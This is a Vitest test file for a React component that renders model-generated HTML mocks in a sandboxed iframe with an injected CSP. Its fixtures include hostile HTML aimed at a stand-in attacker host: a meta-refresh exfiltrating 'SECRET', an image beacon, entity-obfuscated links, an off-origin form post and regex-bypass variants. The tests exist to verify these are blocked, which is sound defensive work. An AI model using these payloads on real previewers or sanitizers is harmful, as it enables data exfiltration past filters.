
import { describe, it, expect } from "vitest";
import { renderToStaticMarkup } from "react-dom/server";
import { HtmlPreviewFrame } from "./HtmlPreviewFrame";

const HTML = "<!doctype html><html><head><title>t</title></head><body><h1>mock</h1></body></html>";

describe("HtmlPreviewFrame", () => {
  const markup = renderToStaticMarkup(
    <HtmlPreviewFrame title="Refreshed header" summary="Moves the title left." html={HTML} />,
  );

  it("renders the title + summary above the frame", () => {
    expect(markup).toContain("Refreshed header");
    expect(markup).toContain("Moves the title left.");
  });

  it("renders the mock via srcDoc (static HTML), not a src URL", () => {
    expect(markup).toContain("srcDoc=");
    expect(markup).toMatch(/&lt;h1&gt;mock&lt;\/h1&gt;/);
    expect(markup).not.toMatch(/<iframe[^>]*\ssrc=/);
  });

  it("sandboxes the iframe to the EMPTY sandbox — model JS must never execute", () => {
    const m = markup.match(/sandbox="([^"]*)"/);
    expect(m).not.toBeNull();
    expect(m?.[1]).toBe("");
    expect(markup).not.toContain("allow-scripts");
    expect(markup).not.toContain("allow-same-origin");
    expect(markup).not.toContain("allow-forms");
    expect(markup).not.toContain("allow-popups");
    expect(markup).not.toContain("allow-top-navigation");
  });

  it("injects a default-src 'none' CSP into the srcDoc (second, independent layer)", () => {
    expect(markup).toContain("Content-Security-Policy");
    expect(markup).toContain("default-src &#x27;none&#x27;");
  });

  it("places the CSP BEFORE the model's markup (a meta CSP only binds what follows it)", () => {
    const cspAt = markup.indexOf("Content-Security-Policy");
    const mockAt = markup.indexOf("&lt;h1&gt;mock");
    expect(cspAt).toBeGreaterThan(-1);
    expect(mockAt).toBeGreaterThan(-1);
    expect(cspAt).toBeLessThan(mockAt);
  });

  it("hardens a bare fragment (no doctype, no head) by prepending the CSP", () => {
    const headless = renderToStaticMarkup(
      <HtmlPreviewFrame title="t" summary="s" html="<div>bare</div>" />,
    );
    const cspAt = headless.indexOf("Content-Security-Policy");
    const bodyAt = headless.indexOf("&lt;div&gt;bare");
    expect(cspAt).toBeGreaterThan(-1);
    expect(cspAt).toBeLessThan(bodyAt);
  });

  it("CSP precedes a resource-loading tag even when a LATE <head> appears after it", () => {
    const attack = renderToStaticMarkup(
      <HtmlPreviewFrame
        title="t"
        summary="s"
        html={'<!doctype html><html><body><img src="https://attacker.example/x"><head></head>'}
      />,
    );
    const cspAt = attack.indexOf("Content-Security-Policy");
    const imgAt = attack.indexOf("attacker.example");
    expect(cspAt).toBeGreaterThan(-1);
    expect(imgAt).toBeGreaterThan(-1);
    expect(cspAt).toBeLessThan(imgAt);
  });

  it("strips <meta http-equiv=refresh> — the CSP cannot block navigation", () => {
    const evil = renderToStaticMarkup(
      <HtmlPreviewFrame
        title="t"
        summary="s"
        html={'<meta http-equiv="refresh" content="0;url=https://attacker.example/?d=SECRET">'}
      />,
    );
    expect(evil).not.toContain("attacker.example");
    expect(evil.toLowerCase()).not.toContain("refresh");
  });

  it("strips meta-refresh even when a '>' inside a quoted attribute value would break a naive regex", () => {
    const bypass = renderToStaticMarkup(
      <HtmlPreviewFrame
        title="t"
        summary="s"
        html={'<meta content="0;url=https://attacker.example/?d=a>b" http-equiv="refresh">'}
      />,
    );
    expect(bypass).not.toContain("attacker.example");
    expect(bypass.toLowerCase()).not.toContain("refresh");
  });

  it("strips meta-refresh with unquoted / oddly-spaced / uppercase attributes", () => {
    const weird = renderToStaticMarkup(
      <HtmlPreviewFrame
        title="t"
        summary="s"
        html={'<META HTTP-EQUIV = REFRESH CONTENT="0;url=https://attacker.example/x">'}
      />,
    );
    expect(weird).not.toContain("attacker.example");
  });

  it("href whitelist survives HTML-entity obfuscation (blacklists do not)", () => {
    const entity = renderToStaticMarkup(
      <HtmlPreviewFrame
        title="t"
        summary="s"
        html={'<a href="&#104;ttps://attacker.example/steal">x</a>'}
      />,
    );
    expect(entity).not.toContain("attacker.example");
  });

  it("neutralises off-origin href/action targets, keeps in-page anchors", () => {
    const links = renderToStaticMarkup(
      <HtmlPreviewFrame
        title="t"
        summary="s"
        html={
          '<a href="https://attacker.example/steal">click</a>' +
          '<form action="https://attacker.example/post"></form>' +
          '<a href="#section">jump</a>'
        }
      />,
    );
    expect(links).not.toContain("attacker.example");
    expect(links).toContain("#section");
  });

  it("keeps <!doctype> FIRST when there is no <head> — never forces quirks mode", () => {
    const noHead = renderToStaticMarkup(
      <HtmlPreviewFrame
        title="t"
        summary="s"
        html="<!doctype html><html><body><p>x</p></body></html>"
      />,
    );
    const doctypeAt = noHead.indexOf("&lt;!doctype html&gt;");
    const cspAt = noHead.indexOf("Content-Security-Policy");
    const bodyAt = noHead.indexOf("&lt;p&gt;x");
    expect(doctypeAt).toBeGreaterThan(-1);
    expect(doctypeAt).toBeLessThan(cspAt);
    expect(cspAt).toBeLessThan(bodyAt);
  });

  it("sets referrerPolicy=no-referrer", () => {
    expect(markup).toContain('referrerPolicy="no-referrer"');
  });
});
